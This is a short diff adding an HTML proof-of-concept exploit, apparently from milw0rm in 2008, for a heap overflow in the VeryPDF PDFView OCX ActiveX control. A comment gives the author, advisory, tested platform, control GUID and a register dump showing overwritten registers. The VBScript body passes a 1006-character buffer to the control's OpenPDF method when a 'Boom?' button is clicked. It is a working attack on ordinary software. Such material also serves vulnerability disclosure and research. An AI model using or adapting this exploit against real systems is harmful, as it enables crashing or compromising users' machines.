@@ -1,0 +1,39 @@
+<!--
+VeryPDF PDFView OCX ActiveX OpenPDF Heap Overflow
+
+Discovered & Written By:
+r0ut3r (writ3r [at] gmail.com / www.bmgsec.com.au)
+
+Advisory: http://www.bmgsec.com.au/advisory/39/
+---------------------------------------------------
+Tested on: WinXP Pro SP2
+
+Version: 2.0.0.1
+GUID: {433268D7-2CD4-43E6-AA24-2188672E7252}
+
+RegKey Safe for Script: True
+RegKey Safe for Init: True
+
+EAX 0003C910 ASCII "AAAAAAAAA""
+ECX 000301D0
+EDX 00000040
+EBX 41414141
+ESP 0013B8D8
+EBP 0013BAF4
+ESI 0003C908 ASCII "AAAAAAAAAAAAAAAAA""
+EDI 41414141
+EIP 7C91B3FB ntdll.7C91B3FB
+-->
+
+<object classid='clsid:433268D7-2CD4-43E6-AA24-2188672E7252' id='target'></object>
+
+<script language='vbscript'>
+ Sub Boom
+    buff = String(1006, "A")
+    target.OpenPDF buff, 1, 1
+
+ End Sub
+</script>
+<input type=button onclick=Boom() value='Boom?'>
+
+# milw0rm.com [2008-11-15]
